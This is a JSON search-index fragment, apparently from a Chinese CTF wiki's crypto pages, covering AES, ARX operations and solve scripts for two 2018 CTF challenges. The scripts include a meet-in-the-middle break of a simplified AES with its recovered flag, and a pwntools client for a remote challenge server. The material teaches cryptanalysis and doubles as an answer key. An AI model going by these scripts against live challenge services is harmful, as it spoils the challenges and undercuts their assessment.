\u901a\u8fc7\u7b80\u5355\u5206\u6790\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7b80\u5316\u7248\u7684 AES\uff0c\u5176\u57fa\u672c\u64cd\u4f5c\u4e3a 9 \u8f6e\u8fed\u4ee3 \u884c\u79fb\u4f4d \u53d8\u79cd\u5b57\u8282\u66ff\u6362 \u5982\u4e0b memcpy ( cipher , plain , 0x10uLL ); for ( i = 0L L ; i <= 8 ; ++ i ) { shift_row ( cipher ); for ( j = 0L L ; j <= 3 ; ++ j ) * ( _DWORD * ) & cipher [ 4 * j ] = box [(( 4 * j + 3 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 3 ]] ^ box [(( 4 * j + 2 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 2 ]] ^ box [(( 4 * j + 1 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 1 ]] ^ box [(( 4 * j + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j ]]; } result = shift_row ( cipher ); for ( k = 0L L ; k <= 0xF ; ++ k ) { result = subbytes [ 256 * k + ( unsigned __int8 ) cipher [ k ]]; cipher [ k ] = result ; } return result ; \u6839\u636e\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u4eec\u5df2\u77e5\u7a0b\u5e8f\u52a0\u5bc6\u7684\u7ed3\u679c\uff0c\u800c subbytes \u548c shift_row \u53c8\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 box \u5bf9\u5e94\u7684\u5e38\u6570\uff0c\u6211\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u4e0a\u4e00\u8f6e\u4e2d cipher[4*j] \u5bf9\u5e94\u7684\u503c\uff0c\u4e00\u5171 32 \u4f4d\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7206\u7834\u7684\u8bdd\uff0c\u663e\u7136\u4e0d\u53ef\u53d6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u8f6e\u90fd\u9700\u8981\u8fd9\u4e48\u7206\u7834\uff0c\u65f6\u95f4\u4e0d\u53ef\u63a5\u53d7\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u5176\u5b83\u529e\u6cd5\u5462\uff1f\u5176\u5b9e\u6709\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u5373\u9996\u5148\u679a\u4e3e\u6240\u6709\u7684 cipher[4*j] \u4e0e cipher[4*j+1] \u7684\u5b57\u8282\u7ec4\u5408\uff0c\u4e00\u5171256*256 \u79cd\u3002\u5728\u679a\u4e3e\u5269\u4e0b\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u8ba1\u7b97\u51fa\u5176\u4e0e\u5bc6\u6587\u7684\u5f02\u6216\u503c\uff0c\u7136\u540e\u53bb\u4e4b\u524d\u7684\u7ec4\u5408\u4e2d\u627e\uff0c\u5982\u679c\u627e\u5230\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u8fd9\u6837\u590d\u6742\u5ea6\u77ac\u95f4\u964d\u5230 O(2^{16}) O(2^{16}) \u3002 \u4ee3\u7801\u5982\u4e0b encflag = [ 0x16 , 0xEA , 0xCA , 0xCC , 0xDA , 0xC8 , 0xDE , 0x1B , 0x16 , 0x03 , 0xF8 , 0x84 , 0x69 , 0x23 , 0xB2 , 0x25 ] subbytebox = eval ( open ( './subbytes' ) . read ()) box = eval ( open ( './box' ) . read ()) print subbytebox [ - 1 ], box [ - 1 ] def inv_shift_row ( now ): tmp = now [ 13 ] now [ 13 ] = now [ 9 ] now [ 9 ] = now [ 5 ] now [ 5 ] = now [ 1 ] now [ 1 ] = tmp tmp = now [ 10 ] now [ 10 ] = now [ 2 ] now [ 2 ] = tmp tmp = now [ 14 ] now [ 14 ] = now [ 6 ] now [ 6 ] = tmp tmp = now [ 15 ] now [ 15 ] = now [ 3 ] now [ 3 ] = now [ 7 ] now [ 7 ] = now [ 11 ] now [ 11 ] = tmp return now def byte2num ( a ): num = 0 for i in range ( 3 , - 1 , - 1 ): num = num * 256 num += a [ i ] return num def getbytes ( i , j , target ): \"\"\" box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] box[((4 * j + 2 + 16 * i) << 8 )+ a2[4 * j + 2]] box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] box[((4 * j + 16 * i) << 8) + a2[4 * j]]; \"\"\" box01 = dict () for c0 in range ( 256 ): for c1 in range ( 256 ): num0 = (( 4 * j + 16 * i ) << 8 ) + c0 num1 = (( 4 * j + 1 + 16 * i ) << 8 ) + c1 num = box [ num0 ] ^ box [ num1 ] box01 [ num ] = ( c0 , c1 ) for c2 in range ( 256 ): for c3 in range ( 256 ): num2 = (( 4 * j + 2 + 16 * i ) << 8 ) + c2 num3 = (( 4 * j + 3 + 16 * i ) << 8 ) + c3 num = box [ num2 ] ^ box [ num3 ] calc = num ^ target if calc in box01 : c0 , c1 = box01 [ calc ] return c0 , c1 , c2 , c3 print 'not found' print i , j , target , calc exit ( 0 ) def solve (): a2 = [ 0 ] * 16 \"\"\" for ( k = 0LL; k <= 0xF; ++k ) { result = subbytesbox[256 * k + a2[k]]; a2[k] = result; } \"\"\" for i in range ( 15 , - 1 , - 1 ): tag = 0 for j in range ( 256 ): if subbytebox [ 256 * i + j ] == encflag [ i ]: # j = a2[k] tag += 1 a2 [ i ] = j if tag == 2 : print 'two number' , i exit ( 0 ) \"\"\" result = shift_row(a2); \"\"\" a2 = inv_shift_row ( a2 ) \"\"\" for ( i = 0LL; i <= 8; ++i ) { shift_row(a2); for ( j = 0LL; j <= 3; ++j ) *(_DWORD *)&a2[4 * j] = box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) << 8) + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) << 8) + a2[4 * j]]; } \"\"\" for i in range ( 8 , - 1 , - 1 ): tmp = [ 0 ] * 16 print 'round ' , i for j in range ( 0 , 4 ): num = byte2num ( a2 [ 4 * j : 4 * j + 4 ]) #print num, a2[4 * j:4 * j + 4] tmp [ 4 * j ], tmp [ 4 * j + 1 ], tmp [ 4 * j + 2 ], tmp [ 4 * j + 3 ] = getbytes ( i , j , num ) a2 = inv_shift_row ( tmp ) print a2 print '' . join ( chr ( c ) for c in a2 ) if __name__ == \"__main__\" : solve () \u8fd0\u884c\u7ed3\u679c \u279c cracemec git: ( master ) \u2717 python exp.py 211 3549048324 round 8 round 7 round 6 round 5 round 4 round 3 round 2 round 1 round 0 [ 67 , 73 , 83 , 67 , 78 , 98 , 35 , 97 , 100 , 102 , 115 , 64 , 70 , 122 , 57 , 51 ] CISCNb#adfs@Fz93 \u9898\u76ee \u00b6 2018 \u5f3a\u7f51\u676f \u51b3\u8d5b revolver \u53c2\u8003\u6587\u732e \u00b6 https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86 Cryptography and Network Security\uff0c Advanced Encryption Standard ppt","title":"AES"},{"location":"crypto/blockcipher/aes/#aes","text":"","title":"AES"},{"location":"crypto/blockcipher/aes/#_1","text":"Advanced Encryption Standard\uff08AES\uff09\uff0c\u9ad8\u7ea7\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u88ab\u8bbe\u8ba1\u6765\u53d6\u4ee3 DES\uff0c\u7531 Joan Daemen \u548c Vincent Rijmen \u6240\u8bbe\u8ba1\u3002\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165\uff1a128 \u6bd4\u7279\u3002 \u8f93\u51fa\uff1a128 \u6bd4\u7279\u3002 SPN \u7f51\u7edc\u7ed3\u6784\u3002 \u5176\u8fed\u4ee3\u8f6e\u6570\u4e0e\u5bc6\u94a5\u957f\u5ea6\u6709\u5173\u7cfb\uff0c\u5982\u4e0b \u5bc6\u94a5\u957f\u5ea6\uff08\u6bd4\u7279\uff09 \u8fed\u4ee3\u8f6e\u6570 128 10 192 12 256 14","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/aes/#_2","text":"","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/aes/#_3","text":"\u5728 AES \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u5757\u90fd\u662f 128 \u6bd4\u7279\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u660e\u786e\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u3002 \u5728 AES \u4e2d\uff0c\u5757\u4e0e State \u4e4b\u95f4\u7684\u8f6c\u6362\u8fc7\u7a0b\u5982\u4e0b \u6240\u4ee5\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e00\u4e2a block \u4e2d\u7684\u5b57\u8282\u662f\u6309\u7167\u5217\u6392\u5217\u8fdb\u5165\u5230\u72b6\u6001\u6570\u7ec4\u7684\u3002 \u800c\u5bf9\u4e8e\u660e\u6587\u6765\u8bf4\uff0c\u4e00\u822c\u6211\u4eec\u4f1a\u9009\u62e9\u4f7f\u7528\u5176\u5341\u516d\u8fdb\u5236\u8fdb\u884c\u7f16\u7801\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"crypto/blockcipher/aes/#_4","text":"\u8fd9\u91cc\u7ed9\u4e2a\u770b\u96ea\u4e0a\u6bd4\u8f83\u597d\u7684 \u56fe\u4f8b \uff0c\u4ee5\u4fbf\u4e8e\u4ecb\u7ecd\u57fa\u672c\u7684\u6d41\u7a0b\uff0c\u6bcf\u4e00\u8f6e\u4e3b\u8981\u5305\u62ec \u8f6e\u5bc6\u94a5\u52a0\uff0cAddRoundKey \u5b57\u8282\u66ff\u6362\uff0cSubBytes \u884c\u79fb\u4f4d\uff0cShiftRows \u5217\u6df7\u6dc6\uff0cMixColumns \u4e0a\u9762\u7684\u5217\u6df7\u6dc6\u7684\u77e9\u9635\u4e58\u6cd5\u7b49\u53f7\u5de6\u8fb9\u7684\u5217\u5411\u91cf\u5e94\u8be5\u5728\u53f3\u8fb9\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e00\u5f20\u5176\u52a0\u89e3\u5bc6\u7684\u5168\u56fe\uff0c\u5176\u89e3\u5bc6\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5f88\u663e\u7136\u3002 \u6211\u4eec\u8fd9\u91cc\u91cd\u70b9\u5173\u6ce8\u4e00\u4e0b\u4ee5\u4e0b\u3002","title":"\u52a0\u89e3\u5bc6\u8fc7\u7a0b"},{"location":"crypto/blockcipher/aes/#_5","text":"\u5728\u5b57\u8282\u66ff\u6362\u7684\u80cc\u540e\uff0c\u5176\u5b9e\u662f\u6709\u5bf9\u5e94\u7684\u6570\u5b66\u89c4\u5219\u6765\u5b9a\u4e49\u5bf9\u5e94\u7684\u66ff\u6362\u8868\u7684\uff0c\u5982\u4e0b \u8fd9\u91cc\u7684\u8fd0\u7b97\u5747\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u5185\u3002","title":"\u5b57\u8282\u66ff\u6362"},{"location":"crypto/blockcipher/aes/#_6","text":"\u8fd9\u91cc\u7684\u8fd0\u7b97\u4e5f\u662f\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u4e0a\uff0c\u4f7f\u7528\u7684\u6a21\u591a\u9879\u5f0f\u4e3a x^8+x^4+x^3+1 x^8+x^4+x^3+1 \u3002","title":"\u5217\u6df7\u6dc6"},{"location":"crypto/blockcipher/aes/#_7","text":"","title":"\u5bc6\u94a5\u6269\u5c55"},{"location":"crypto/blockcipher/aes/#_8","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \u4ea4\u6362\u9006\u5411\u884c\u79fb\u4f4d\u548c\u9006\u5411\u5b57\u8282\u4ee3\u66ff\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\u3002 \u4ea4\u6362\u8f6e\u5bc6\u94a5\u52a0\u548c\u9006\u5411\u5217\u6df7\u6dc6\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\uff0c\u5173\u952e\u5728\u4e8e \u9996\u5148\u53ef\u4ee5\u628a\u5f02\u6216\u770b\u6210\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u52a0\u6cd5 \u7136\u540e\u591a\u9879\u5f0f\u4e2d\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u5177\u6709\u5206\u914d\u7387\u3002","title":"\u7b49\u4ef7\u89e3\u5bc6\u7b97\u6cd5"},{"location":"crypto/blockcipher/aes/#_9","text":"\u79ef\u5206\u653b\u51fb","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/blockcipher/aes/#2018-crackmec","text":"\u901a\u8fc7\u7b80\u5355\u5206\u6790\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7b80\u5316\u7248\u7684 AES\uff0c\u5176\u57fa\u672c\u64cd\u4f5c\u4e3a 9 \u8f6e\u8fed\u4ee3 \u884c\u79fb\u4f4d \u53d8\u79cd\u5b57\u8282\u66ff\u6362 \u5982\u4e0b memcpy ( cipher , plain , 0x10uLL ); for ( i = 0L L ; i <= 8 ; ++ i ) { shift_row ( cipher ); for ( j = 0L L ; j <= 3 ; ++ j ) * ( _DWORD * ) & cipher [ 4 * j ] = box [(( 4 * j + 3 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 3 ]] ^ box [(( 4 * j + 2 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 2 ]] ^ box [(( 4 * j + 1 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 1 ]] ^ box [(( 4 * j + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j ]]; } result = shift_row ( cipher ); for ( k = 0L L ; k <= 0xF ; ++ k ) { result = subbytes [ 256 * k + ( unsigned __int8 ) cipher [ k ]]; cipher [ k ] = result ; } return result ; \u6839\u636e\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u4eec\u5df2\u77e5\u7a0b\u5e8f\u52a0\u5bc6\u7684\u7ed3\u679c\uff0c\u800c subbytes \u548c shift_row \u53c8\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 box \u5bf9\u5e94\u7684\u5e38\u6570\uff0c\u6211\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u4e0a\u4e00\u8f6e\u4e2d cipher[4*j] \u5bf9\u5e94\u7684\u503c\uff0c\u4e00\u5171 32 \u4f4d\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7206\u7834\u7684\u8bdd\uff0c\u663e\u7136\u4e0d\u53ef\u53d6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u8f6e\u90fd\u9700\u8981\u8fd9\u4e48\u7206\u7834\uff0c\u65f6\u95f4\u4e0d\u53ef\u63a5\u53d7\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u5176\u5b83\u529e\u6cd5\u5462\uff1f\u5176\u5b9e\u6709\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u5373\u9996\u5148\u679a\u4e3e\u6240\u6709\u7684 cipher[4*j] \u4e0e cipher[4*j+1] \u7684\u5b57\u8282\u7ec4\u5408\uff0c\u4e00\u5171256*256 \u79cd\u3002\u5728\u679a\u4e3e\u5269\u4e0b\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u8ba1\u7b97\u51fa\u5176\u4e0e\u5bc6\u6587\u7684\u5f02\u6216\u503c\uff0c\u7136\u540e\u53bb\u4e4b\u524d\u7684\u7ec4\u5408\u4e2d\u627e\uff0c\u5982\u679c\u627e\u5230\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u8fd9\u6837\u590d\u6742\u5ea6\u77ac\u95f4\u964d\u5230 O(2^{16}) O(2^{16}) \u3002 \u4ee3\u7801\u5982\u4e0b encflag = [ 0x16 , 0xEA , 0xCA , 0xCC , 0xDA , 0xC8 , 0xDE , 0x1B , 0x16 , 0x03 , 0xF8 , 0x84 , 0x69 , 0x23 , 0xB2 , 0x25 ] subbytebox = eval ( open ( './subbytes' ) . read ()) box = eval ( open ( './box' ) . read ()) print subbytebox [ - 1 ], box [ - 1 ] def inv_shift_row ( now ): tmp = now [ 13 ] now [ 13 ] = now [ 9 ] now [ 9 ] = now [ 5 ] now [ 5 ] = now [ 1 ] now [ 1 ] = tmp tmp = now [ 10 ] now [ 10 ] = now [ 2 ] now [ 2 ] = tmp tmp = now [ 14 ] now [ 14 ] = now [ 6 ] now [ 6 ] = tmp tmp = now [ 15 ] now [ 15 ] = now [ 3 ] now [ 3 ] = now [ 7 ] now [ 7 ] = now [ 11 ] now [ 11 ] = tmp return now def byte2num ( a ): num = 0 for i in range ( 3 , - 1 , - 1 ): num = num * 256 num += a [ i ] return num def getbytes ( i , j , target ): \"\"\" box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] box[((4 * j + 2 + 16 * i) << 8 )+ a2[4 * j + 2]] box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] box[((4 * j + 16 * i) << 8) + a2[4 * j]]; \"\"\" box01 = dict () for c0 in range ( 256 ): for c1 in range ( 256 ): num0 = (( 4 * j + 16 * i ) << 8 ) + c0 num1 = (( 4 * j + 1 + 16 * i ) << 8 ) + c1 num = box [ num0 ] ^ box [ num1 ] box01 [ num ] = ( c0 , c1 ) for c2 in range ( 256 ): for c3 in range ( 256 ): num2 = (( 4 * j + 2 + 16 * i ) << 8 ) + c2 num3 = (( 4 * j + 3 + 16 * i ) << 8 ) + c3 num = box [ num2 ] ^ box [ num3 ] calc = num ^ target if calc in box01 : c0 , c1 = box01 [ calc ] return c0 , c1 , c2 , c3 print 'not found' print i , j , target , calc exit ( 0 ) def solve (): a2 = [ 0 ] * 16 \"\"\" for ( k = 0LL; k <= 0xF; ++k ) { result = subbytesbox[256 * k + a2[k]]; a2[k] = result; } \"\"\" for i in range ( 15 , - 1 , - 1 ): tag = 0 for j in range ( 256 ): if subbytebox [ 256 * i + j ] == encflag [ i ]: # j = a2[k] tag += 1 a2 [ i ] = j if tag == 2 : print 'two number' , i exit ( 0 ) \"\"\" result = shift_row(a2); \"\"\" a2 = inv_shift_row ( a2 ) \"\"\" for ( i = 0LL; i <= 8; ++i ) { shift_row(a2); for ( j = 0LL; j <= 3; ++j ) *(_DWORD *)&a2[4 * j] = box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) << 8) + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) << 8) + a2[4 * j]]; } \"\"\" for i in range ( 8 , - 1 , - 1 ): tmp = [ 0 ] * 16 print 'round ' , i for j in range ( 0 , 4 ): num = byte2num ( a2 [ 4 * j : 4 * j + 4 ]) #print num, a2[4 * j:4 * j + 4] tmp [ 4 * j ], tmp [ 4 * j + 1 ], tmp [ 4 * j + 2 ], tmp [ 4 * j + 3 ] = getbytes ( i , j , num ) a2 = inv_shift_row ( tmp ) print a2 print '' . join ( chr ( c ) for c in a2 ) if __name__ == \"__main__\" : solve () \u8fd0\u884c\u7ed3\u679c \u279c cracemec git: ( master ) \u2717 python exp.py 211 3549048324 round 8 round 7 round 6 round 5 round 4 round 3 round 2 round 1 round 0 [ 67 , 73 , 83 , 67 , 78 , 98 , 35 , 97 , 100 , 102 , 115 , 64 , 70 , 122 , 57 , 51 ] CISCNb#adfs@Fz93","title":"2018 \u56fd\u8d5b Crackmec"},{"location":"crypto/blockcipher/aes/#_10","text":"2018 \u5f3a\u7f51\u676f \u51b3\u8d5b revolver","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/aes/#_11","text":"https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86 Cryptography and Network Security\uff0c Advanced Encryption Standard ppt","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/blockcipher/arx-operations/","text":"ARX: Add-Rotate-Xor \u00b6 \u6982\u8ff0 \u00b6 ARX \u8fd0\u7b97\u662f\u5982\u4e0b 3 \u79cd\u57fa\u672c\u8fd0\u7b97\u7684\u7edf\u79f0 - Add \u6709\u9650\u57df\u4e0a\u7684\u6a21\u52a0 - Rotate \u5faa\u73af\u79fb\u4f4d - Xor \u5f02\u6216 \u6709\u8bb8\u591a\u5e38\u89c1\u7684\u5757\u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6e\u51fd\u6570\u4e2d\u53ea\u7528\u5230\u4e86\u8fd9 3 \u79cd\u57fa\u672c\u8fd0\u7b97\uff0c\u5178\u578b\u4f8b\u5b50\u5982 Salsa20\u3001Speck \u7b49\u3002\u53e6\u5916 IDEA \u4e5f\u91c7\u7528\u4e86\u7c7b\u4f3c\u7684\u57fa\u672c\u8fd0\u7b97\u6765\u6784\u5efa\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u4ee5\u4e58\u6cd5\u4ee3\u66ff\u4e86\u79fb\u4f4d\u3002 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u64cd\u4f5c\u7b80\u5355\uff0c\u8fd0\u7b97\u901f\u5ea6\u5feb \u6267\u884c\u65f6\u95f4\u4e3a\u5e38\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u57fa\u4e8e\u65f6\u95f4\u7684\u6d4b\u4fe1\u9053\u653b\u51fb \u7ec4\u5408\u540e\u7684\u51fd\u6570\u8868\u8fbe\u80fd\u529b\u8db3\u591f\u5f3a\uff08\u53c2\u89c1\u4e0b\u65b9\u4f8b\u9898\uff09 \u7f3a\u70b9 \u00b6 \u5728\u4e09\u79cd\u57fa\u672c\u8fd0\u7b97\u5f53\u4e2d\uff0cRotate\u3001Xor \u5bf9\u4e8e\u5355\u4e2a bit \u6765\u8bf4\u5747\u662f\u5b8c\u5168\u7ebf\u6027\u7684\u8fd0\u7b97\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u8106\u5f31\u6027(\u53c2\u89c1 Rotational cryptanalysis ) \u9898\u76ee \u00b6 2018 *ctf primitive \u00b6 \u5206\u6790 \u00b6 \u672c\u9898\u8981\u6c42\u6211\u4eec\u7ec4\u5408\u4e00\u5b9a\u6570\u76ee\u4ee5\u5185\u7684 Add-Rotate-Xor \u8fd0\u7b97\uff0c\u4f7f\u5f97\u83b7\u5f97\u7684\u52a0\u5bc6\u7b97\u6cd5\u80fd\u591f\u5c06\u56fa\u5b9a\u660e\u6587\u52a0\u5bc6\u6210\u6307\u5b9a\u7684\u968f\u673a\u5bc6\u6587\uff0c\u5373\u901a\u8fc7\u57fa\u7840\u8fd0\u7b97\u6765\u6784\u5efa\u4efb\u610f\u7f6e\u6362\u51fd\u6570\u3002\u6210\u529f\u6784\u5efa 3 \u6b21\u4e4b\u540e\u5373\u53ef\u83b7\u5f97 flag\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u5bf9\u4e8e\u6a21 256 \u4e0b\u7684\u8fd0\u7b97\uff0c\u4e00\u79cd\u5178\u578b\u7684\u57fa\u4e8e ARX \u7684\u6362\u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u7ec4\u5408 RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) \u4e0a\u8ff0\u51fd\u6570\u5bf9\u5e94\u4e86\u4e00\u4e2a\u5c06 254 \u548c 255 \u8fdb\u884c\u4ea4\u6362\uff0c\u540c\u65f6\u4fdd\u6301\u5176\u5b83\u6570\u5b57\u4e0d\u53d8\u7684\u7f6e\u6362\u8fd0\u7b97\u3002 \u76f4\u89c9\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u5728\u7b2c\u4e00\u6b65\u7684\u6a21\u52a0 2 \u8fd0\u7b97\u4e2d\uff0c\u4ec5\u6709\u8f93\u5165\u4e3a 254\u3001255 \u65f6\u4f1a\u53d1\u751f\u8fdb\u4f4d\uff0c\u8be5\u7ec4\u5408\u51fd\u6570\u5f97\u4ee5\u533a\u522b\u5bf9\u5f85\u8fd9\u4e00\u60c5\u51b5\u3002 \u5229\u7528\u4e0a\u8ff0\u539f\u5b50\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u4e24\u4e2a\u6570\u5b57 a,b \u7684\u7f6e\u6362\uff0c\u7ed3\u5408 Xor \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u51cf\u5c11\u6240\u9700\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u76ee\uff0c\u4f7f\u5176\u6ee1\u8db3\u9898\u76ee\u7ed9\u51fa\u7684\u9650\u5236\u3002\u4e00\u79cd\u53ef\u80fd\u7684\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b\uff1a \u5bf9\u4e8e a,b \uff0c\u901a\u8fc7\u6a21\u52a0\u64cd\u4f5c\u4f7f\u5f97 a \u4e3a0 \u901a\u8fc7\u53f3\u79fb\u4f7f\u5f97b\u7684\u6700\u4f4e\u4f4d\u4e3a 1 \u82e5 b \u4e0d\u4e3a 1\uff0c\u8fdb\u884c Xor 1, Add 255 \u64cd\u4f5c\uff0c\u4fdd\u6301 a \u4ecd\u7136\u4e3a0\uff0c\u540c\u65f6 b \u7684\u6570\u503c\u51cf\u5c0f \u91cd\u590d\u64cd\u4f5c2-3\u76f4\u81f3 b \u4e3a1 \u8fdb\u884c Add 254 \u53ca\u6362\u4f4d\u64cd\u4f5c\uff0c\u4ea4\u6362 a,b \u5bf9\u4e8e\u6362\u4f4d\u4ee5\u5916\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u52a0\u5165\u5bf9\u5e94\u7684\u9006\u8fd0\u7b97\uff0c\u786e\u4fdd a,b \u4ee5\u5916\u7684\u6570\u503c\u4e0d\u53d8 \u5b8c\u6574\u7684\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 : - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) dopow () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp ans = [] ans . append (( 0 , 256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : lo <<= 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0 , 255 )) b -= 1 ans . append (( 0 , 254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"ARX: Add-Rotate-Xor"},{"location":"crypto/blockcipher/arx-operations/#arx-add-rotate-xor","text":"","title":"ARX: Add-Rotate-Xor"},{"location":"crypto/blockcipher/arx-operations/#_1","text":"ARX \u8fd0\u7b97\u662f\u5982\u4e0b 3 \u79cd\u57fa\u672c\u8fd0\u7b97\u7684\u7edf\u79f0 - Add \u6709\u9650\u57df\u4e0a\u7684\u6a21\u52a0 - Rotate \u5faa\u73af\u79fb\u4f4d - Xor \u5f02\u6216 